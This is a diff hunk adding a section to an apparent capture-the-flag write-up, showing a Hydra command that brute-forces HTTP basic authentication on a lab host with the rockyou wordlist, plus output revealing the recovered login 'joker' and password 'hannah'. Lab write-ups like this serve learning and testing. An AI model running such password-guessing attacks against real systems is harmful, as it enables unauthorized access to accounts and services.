@@ -171,6 +171,26 @@ We see we have a weblogin available, so lets gather a bit more information on th
 
 ![Screenshot_2022-03-28_10-12-29](https://user-images.githubusercontent.com/68706090/160451447-84d63393-782c-438c-bcb9-9bc8beb964b2.png)
 
+Below shows we just have to do basic authentication with hydra using http-get
+
+![Screenshot_2022-03-28_10-32-22](https://user-images.githubusercontent.com/68706090/160454467-2abac213-0e4a-4655-989c-3aae601b86fc.png)
+
+#Hydra
+
+```console
+hydra -l joker -P /home/noob2uub/Documents/Wordlists/rockyou.txt -s 8080 -f 10.10.150.75 http-get
+Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-03-28 10:30:53
+[WARNING] You must supply the web page as an additional option or via -m, default path set to /
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+[DATA] attacking http-get://10.10.150.75:8080/
+[8080][http-get] host: 10.10.150.75   login: joker   password: hannah
+[STATUS] attack finished for 10.10.150.75 (valid pair found)
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-03-28 10:31:25
+```
+
 
 
 
